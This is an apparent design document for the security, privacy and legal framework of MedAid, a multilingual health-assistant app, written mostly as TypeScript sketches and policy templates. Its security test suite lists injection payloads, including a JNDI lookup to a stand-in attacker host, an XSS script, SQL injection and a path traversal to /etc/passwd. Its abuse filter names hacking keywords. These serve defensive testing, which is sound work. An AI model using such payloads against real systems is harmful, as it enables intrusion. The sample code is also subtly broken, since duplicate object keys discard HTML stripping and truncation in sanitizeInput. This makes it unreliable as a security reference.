# Security, Privacy & Legal Framework

## 🔒 Security Architecture

MedAid implements a comprehensive security framework designed to protect sensitive health information while maintaining accessibility and offline functionality.

### Core Security Principles
1. **Zero Trust Architecture**: Verify every request and user action
2. **Data Minimization**: Collect only essential information
3. **Encryption Everywhere**: End-to-end encryption for sensitive data
4. **Privacy by Design**: Default to most private settings
5. **Transparent Consent**: Clear, informed user consent

## 🛡️ Data Protection & Privacy

### Privacy-First Data Model
```typescript
// Data classification for privacy controls
interface DataClassification {
  // Public data - no protection needed
  public: {
    ui_preferences: UIPreferences;
    language_selection: string;
    app_version: string;
  };
  
  // Personal data - encrypted storage, user controlled
  personal: {
    reminders: EncryptedReminder[];
    chat_history: EncryptedChatHistory[];
    emergency_contacts: EncryptedContacts[];
  };
  
  // Sensitive data - maximum protection, explicit consent
  sensitive: {
    location_data?: EncryptedLocation;
    health_conditions?: EncryptedHealthData;
    biometric_data?: never; // Explicitly not collected
  };
  
  // Metadata - anonymized, aggregated only
  analytics: {
    usage_patterns: AnonymizedUsage;
    performance_metrics: TechnicalMetrics;
    error_logs: SanitizedErrors;
  };
}
```

### Data Minimization Strategy
```typescript
class DataMinimizationManager {
  // Collect only essential data
  collectUserData(userData: UserInput): MinimalUserData {
    return {
      // Required for functionality
      language: userData.language,
      timezone: userData.timezone,
      
      // Optional, user-controlled
      ...(userData.allowReminders && { 
        reminders: this.sanitizeReminders(userData.reminders) 
      }),
      ...(userData.allowEmergencyContacts && { 
        contacts: this.encryptContacts(userData.contacts) 
      }),
      
      // Never collect
      // - Real names (use anonymous IDs)
      // - Personal identifiers (except for recovery)
      // - Detailed health records
      // - Precise location (city-level only for hospitals)
    };
  }
  
  // Auto-delete expired data
  async cleanupExpiredData(): Promise<void> {
    const retentionPolicies = {
      chat_history: 30, // days
      location_cache: 1,  // day
      error_logs: 7,     // days
      analytics: 90,     // days
    };
    
    for (const [dataType, retentionDays] of Object.entries(retentionPolicies)) {
      await this.deleteDataOlderThan(dataType, retentionDays);
    }
  }
}
```

### Encryption Implementation
```typescript
// Client-side encryption for sensitive data
class EncryptionService {
  private userKey: CryptoKey;
  
  async initializeUserKey(passphrase?: string): Promise<void> {
    if (passphrase) {
      // Derive key from user passphrase
      this.userKey = await this.deriveKey(passphrase);
    } else {
      // Generate random key for anonymous users
      this.userKey = await window.crypto.subtle.generateKey(
        { name: 'AES-GCM', length: 256 },
        false, // not extractable
        ['encrypt', 'decrypt']
      );
      
      // Store encrypted key in IndexedDB
      await this.storeEncryptedKey(this.userKey);
    }
  }
  
  async encryptData(data: any): Promise<EncryptedData> {
    const plaintext = JSON.stringify(data);
    const iv = window.crypto.getRandomValues(new Uint8Array(12));
    
    const encrypted = await window.crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      this.userKey,
      new TextEncoder().encode(plaintext)
    );
    
    return {
      data: Array.from(new Uint8Array(encrypted)),
      iv: Array.from(iv),
      timestamp: Date.now(),
    };
  }
  
  async decryptData(encryptedData: EncryptedData): Promise<any> {
    const decrypted = await window.crypto.subtle.decrypt(
      { name: 'AES-GCM', iv: new Uint8Array(encryptedData.iv) },
      this.userKey,
      new Uint8Array(encryptedData.data)
    );
    
    return JSON.parse(new TextDecoder().decode(decrypted));
  }
}
```

## 📋 Consent Management

### Granular Consent System
```typescript
interface ConsentCategories {
  essential: {
    required: true;
    description: "Core app functionality";
    data: ["language", "timezone", "basic_errors"];
  };
  
  reminders: {
    required: false;
    description: "Medicine reminder notifications";
    data: ["reminder_data", "notification_permissions"];
  };
  
  emergency: {
    required: false;
    description: "SOS emergency features";
    data: ["location_access", "emergency_contacts"];
  };
  
  analytics: {
    required: false;
    description: "Anonymous usage analytics";
    data: ["usage_patterns", "performance_metrics"];
  };
  
  ai_improvement: {
    required: false;
    description: "Improve AI responses (anonymized)";
    data: ["anonymized_queries", "response_ratings"];
  };
}

class ConsentManager {
  private consentStatus: Map<string, ConsentStatus>;
  
  async requestConsent(category: string): Promise<boolean> {
    // Show clear, translated consent dialog
    const consent = await this.showConsentDialog(category);
    
    if (consent.granted) {
      this.consentStatus.set(category, {
        granted: true,
        timestamp: Date.now(),
        version: this.getConsentVersion(),
      });
      
      // Log consent for audit trail
      await this.logConsentEvent(category, 'granted');
      return true;
    }
    
    return false;
  }
  
  async withdrawConsent(category: string): Promise<void> {
    this.consentStatus.set(category, {
      granted: false,
      timestamp: Date.now(),
      version: this.getConsentVersion(),
    });
    
    // Delete associated data
    await this.deleteDataForCategory(category);
    
    // Log withdrawal
    await this.logConsentEvent(category, 'withdrawn');
  }
  
  canProcessData(category: string): boolean {
    const consent = this.consentStatus.get(category);
    return consent?.granted === true;
  }
}
```

### Consent UI Flow
```typescript
// Multilingual consent dialogs
const consentDialogs = {
  hi: {
    title: 'डेटा उपयोग की अनुमति',
    description: 'MedAid बेहतर सेवा के लिए कुछ डेटा का उपयोग करना चाहता है।',
    categories: {
      analytics: 'गुमनाम उपयोग डेटा एप्प को बेहतर बनाने के लिए',
      emergency: 'आपातकालीन स्थिति में स्थान साझा करने के लिए',
    },
    buttons: {
      accept: 'स्वीकार करें',
      decline: 'मना करें',
      customize: 'अनुकूलित करें',
    }
  },
  en: {
    title: 'Data Usage Consent',
    description: 'MedAid would like to use some data to provide better service.',
    // ... English translations
  }
};
```

## 🏥 Medical & Legal Compliance

### Medical Disclaimer Framework
```typescript
// Comprehensive medical disclaimers in all languages
const medicalDisclaimers = {
  hi: {
    primary: '⚠️ चेतावनी: यह केवल सामान्य स्वास्थ्य जानकारी है। यह डॉक्टरी सलाह, निदान या इलाज का विकल्प नहीं है।',
    emergency: '🚨 आपातकाल में तुरंत 108 डायल करें या नजदीकी अस्पताल जाएं।',
    limitation: 'MedAid एक सहायक उपकरण है। गंभीर स्वास्थ्य समस्याओं के लिए हमेशा योग्य डॉक्टर से सलाह लें।',
  },
  en: {
    primary: '⚠️ Warning: This is general health information only. It is not a substitute for professional medical advice, diagnosis, or treatment.',
    emergency: '🚨 In emergencies, immediately call 108 or go to the nearest hospital.',
    limitation: 'MedAid is an assistive tool. Always consult qualified medical professionals for serious health concerns.',
  }
};

class MedicalDisclaimerService {
  showDisclaimer(response: AIResponse, language: string): AIResponse {
    return {
      ...response,
      disclaimer: medicalDisclaimers[language],
      safety_level: this.assessSafetyLevel(response.content),
      escalation_required: this.requiresEscalation(response.content),
    };
  }
  
  private assessSafetyLevel(content: string): SafetyLevel {
    const redFlags = [
      'chest pain', 'difficulty breathing', 'severe bleeding',
      'unconscious', 'seizure', 'suicide', 'overdose'
    ];
    
    const hasRedFlag = redFlags.some(flag => 
      content.toLowerCase().includes(flag)
    );
    
    return hasRedFlag ? 'HIGH_RISK' : 'GENERAL';
  }
  
  private requiresEscalation(content: string): boolean {
    // Automatically escalate high-risk scenarios
    return this.assessSafetyLevel(content) === 'HIGH_RISK';
  }
}
```

### Indian Legal Compliance
```typescript
// Compliance with Indian data protection laws
class IndianComplianceManager {
  // Digital Personal Data Protection Act, 2023 compliance
  async handleDataSubjectRights(request: DataRightsRequest): Promise<void> {
    switch (request.type) {
      case 'ACCESS':
        await this.provideDataAccess(request.userId);
        break;
      case 'CORRECTION':
        await this.correctData(request.userId, request.corrections);
        break;
      case 'ERASURE':
        await this.eraseUserData(request.userId);
        break;
      case 'PORTABILITY':
        await this.exportUserData(request.userId);
        break;
    }
  }
  
  // Information Technology Act, 2000 compliance
  async logSecurityIncident(incident: SecurityIncident): Promise<void> {
    // Report significant breaches to CERT-In within 6 hours
    if (incident.severity >= SecuritySeverity.HIGH) {
      await this.reportToCERTIn(incident);
    }
    
    // Notify affected users
    await this.notifyAffectedUsers(incident);
  }
  
  // Healthcare data specific compliance
  ensureHealthDataProtection(healthData: HealthData): ProtectedHealthData {
    return {
      ...healthData,
      // Remove direct identifiers
      anonymized_id: this.generateAnonymousId(),
      // Encrypt sensitive fields
      symptoms: this.encryptField(healthData.symptoms),
      // Add audit trail
      access_log: this.createAccessLog(),
    };
  }
}
```

## 🔐 API Security

### Authentication & Authorization
```typescript
// Optional phone-based authentication for data sync
class AuthenticationService {
  async authenticateUser(phoneNumber: string): Promise<AuthResult> {
    // Send OTP via SMS
    const otpToken = await this.sendOTP(phoneNumber);
    
    // Return temporary auth token
    return {
      tempToken: otpToken,
      expiresIn: 300, // 5 minutes
      requiresVerification: true,
    };
  }
  
  async verifyOTP(tempToken: string, otp: string): Promise<UserSession> {
    const isValid = await this.validateOTP(tempToken, otp);
    
    if (isValid) {
      const session = await this.createSession();
      
      return {
        sessionToken: session.token,
        userId: session.userId,
        expiresIn: 86400, // 24 hours
        permissions: ['reminders', 'chat_history'],
      };
    }
    
    throw new Error('Invalid OTP');
  }
  
  // Anonymous usage without authentication
  createAnonymousSession(): AnonymousSession {
    return {
      anonymousId: this.generateAnonymousId(),
      features: ['basic_chat', 'offline_reminders'],
      limitations: ['no_sync', 'no_backup'],
    };
  }
}
```

### API Rate Limiting & Abuse Prevention
```typescript
class SecurityMiddleware {
  // Rate limiting by user/IP
  async rateLimitCheck(request: Request): Promise<boolean> {
    const userId = this.extractUserId(request);
    const ip = this.getClientIP(request);
    
    const limits = {
      ai_chat: { requests: 10, window: 3600 }, // 10 per hour
      sms_sos: { requests: 3, window: 3600 },  // 3 per hour
      translation: { requests: 100, window: 3600 }, // 100 per hour
    };
    
    const endpoint = this.getEndpoint(request);
    const limit = limits[endpoint];
    
    if (!limit) return true;
    
    const usage = await this.getUsage(userId || ip, endpoint, limit.window);
    return usage < limit.requests;
  }
  
  // Input sanitization
  sanitizeInput(input: any): SanitizedInput {
    return {
      // Remove potential XSS
      text: this.stripHTML(input.text),
      // Limit length
      text: this.truncate(input.text, 1000),
      // Validate language
      language: this.validateLanguage(input.language),
      // Remove PII patterns
      text: this.removePII(input.text),
    };
  }
  
  // Abuse detection
  async detectAbuse(request: Request): Promise<AbuseResult> {
    const patterns = [
      /spam|advertisement|promotion/i,
      /phone.*number|email.*address/i, // PII sharing attempts
      /hack|exploit|vulnerability/i,    // Security testing
    ];
    
    const content = request.body.text || '';
    const hasPattern = patterns.some(pattern => pattern.test(content));
    
    if (hasPattern) {
      await this.logSuspiciousActivity(request);
      return { blocked: true, reason: 'potential_abuse' };
    }
    
    return { blocked: false };
  }
}
```

## 📄 Legal Documentation

### Privacy Policy Template
```markdown
# MedAid Privacy Policy (हिंदी में भी उपलब्ध)

## Information We Collect

### Essential Data (Required)
- **Language Preference**: To show content in your language
- **Basic Error Logs**: To fix technical issues
- **App Usage Analytics**: Anonymous data to improve performance

### Optional Data (With Your Consent)
- **Medicine Reminders**: Stored locally on your device
- **Emergency Contacts**: Encrypted and stored securely
- **Location Data**: Only when you use SOS feature
- **Voice Recordings**: Processed locally, not stored

### Data We Never Collect
- ❌ Your real name or identity
- ❌ Detailed medical records
- ❌ Precise location tracking
- ❌ Biometric data
- ❌ Payment information

## How We Use Your Data

1. **Provide Health Guidance**: AI responses in your language
2. **Send Reminders**: Medicine notifications (if enabled)
3. **Emergency SOS**: Share location with your contacts
4. **Improve Service**: Anonymous analytics and error fixing

## Your Rights

- ✅ **Access**: See what data we have about you
- ✅ **Correct**: Fix any incorrect information
- ✅ **Delete**: Remove your data completely
- ✅ **Withdraw**: Change your consent choices anytime

## Data Security

- 🔒 **Encryption**: All sensitive data encrypted
- 🏠 **Local Storage**: Most data stays on your device
- 🛡️ **Minimal Collection**: We collect as little as possible
- 🇮🇳 **Indian Servers**: Data stored in India

## Contact Us

- **Email**: privacy@medaid.app
- **Phone**: [Indian phone number]
- **Address**: [Indian office address]

Last Updated: October 30, 2025
```

### Terms of Service Key Points
```markdown
# MedAid Terms of Service

## Medical Disclaimer

🚨 **IMPORTANT**: MedAid provides general health information only.

- ❌ **Not Medical Advice**: Our AI cannot diagnose or treat medical conditions
- ❌ **Not Emergency Service**: In emergencies, call 108 immediately
- ❌ **Not Doctor Replacement**: Always consult healthcare professionals

## Your Responsibilities

1. **Use Appropriately**: For general health information only
2. **Emergency Protocol**: Call emergency services in serious situations
3. **Accurate Information**: Provide truthful symptoms/information
4. **Legal Use**: Don't misuse or abuse the service

## Our Responsibilities

1. **Best Effort**: Provide accurate, helpful information
2. **Privacy Protection**: Secure your data according to our Privacy Policy
3. **Service Availability**: Aim for reliable service (no 100% guarantee)
4. **Safety First**: Prioritize user safety in all responses

## Limitation of Liability

MedAid and its creators are not liable for:
- Medical decisions based on our guidance
- Delays or errors in emergency situations
- Technical failures or service interruptions
- Consequences of misusing the service

## Indian Law Jurisdiction

These terms are governed by Indian law and subject to Indian courts.
```

## 🔍 Security Audit & Testing

### Security Testing Checklist
```typescript
// Automated security testing
class SecurityTestSuite {
  async runSecurityTests(): Promise<SecurityReport> {
    const tests = [
      this.testInputSanitization(),
      this.testEncryptionStrength(),
      this.testRateLimiting(),
      this.testDataLeakage(),
      this.testAuthenticationBypass(),
      this.testPrivacyCompliance(),
    ];
    
    const results = await Promise.all(tests);
    
    return {
      overall_score: this.calculateSecurityScore(results),
      vulnerabilities: this.identifyVulnerabilities(results),
      recommendations: this.generateRecommendations(results),
      compliance_status: this.checkCompliance(results),
    };
  }
  
  private async testInputSanitization(): Promise<TestResult> {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      'DROP TABLE users;--',
      '${jndi:ldap://attacker.com/}',
      '../../../etc/passwd',
    ];
    
    // Test all input endpoints
    for (const input of maliciousInputs) {
      const result = await this.submitInput(input);
      if (this.containsUnsanitizedData(result)) {
        return { passed: false, vulnerability: 'XSS/Injection' };
      }
    }
    
    return { passed: true };
  }
}
```

### Incident Response Plan
```typescript
// Security incident response procedures
class IncidentResponseManager {
  async handleSecurityIncident(incident: SecurityIncident): Promise<void> {
    // 1. Immediate containment
    if (incident.severity >= SecuritySeverity.HIGH) {
      await this.activateEmergencyMode();
    }
    
    // 2. Assessment and investigation
    const impact = await this.assessImpact(incident);
    
    // 3. User notification (if required)
    if (impact.affectsUsers) {
      await this.notifyAffectedUsers(impact);
    }
    
    // 4. Regulatory reporting
    if (incident.requiresReporting) {
      await this.reportToAuthorities(incident);
    }
    
    // 5. Remediation and recovery
    await this.implementFixes(incident);
    
    // 6. Post-incident review
    await this.conductPostIncidentReview(incident);
  }
  
  private async activateEmergencyMode(): Promise<void> {
    // Temporarily disable non-essential features
    await this.disableFeatures(['ai_chat', 'data_sync']);
    
    // Enable enhanced monitoring
    await this.enableEnhancedLogging();
    
    // Notify incident response team
    await this.alertIncidentTeam();
  }
}
```

---

This comprehensive security and privacy framework ensures MedAid meets the highest standards for protecting user data while remaining compliant with Indian laws and healthcare regulations.